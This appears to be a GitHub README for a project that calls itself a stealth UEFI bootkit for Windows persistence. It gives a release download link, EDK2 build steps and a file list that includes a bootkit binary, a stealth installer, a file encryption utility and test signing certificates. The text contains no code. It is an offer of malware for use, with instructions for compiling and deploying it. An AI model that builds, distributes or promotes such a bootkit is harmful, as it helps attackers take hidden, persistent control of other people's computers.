
## Download

[Download Latest Release](https://github.com/abstractmando/ArchiveBootKit/releases)

## Build Instructions

### Dependencies

- EDK2 environment (Windows/Linux)
- GCC or CLANG cross compiler (targeting x86_64)
- Node.js (for backend server, if used)

### Compilation

1. Clone the repo into your EDK2 workspace.
2. Update your target.txt to include the path to Syrial.inf.
3. Build using your standard EDK2 build commands.

## Files

| File | Description |
|------|-------------|
| bootkit.efi | Main UEFI bootkit binary |
| installer.exe | Windows installer for deployment |
| installer_stealth.exe | Stealth mode installer |
| Encryptor.exe | File encryption utility |
| test_cert.* | Test certificates for signing |
| src/ | Source code directory |

## License

MIT

---

A stealth UEFI bootkit for Windows persistence. Low-level bootloader hijack with signed payload and dynamic API resolution.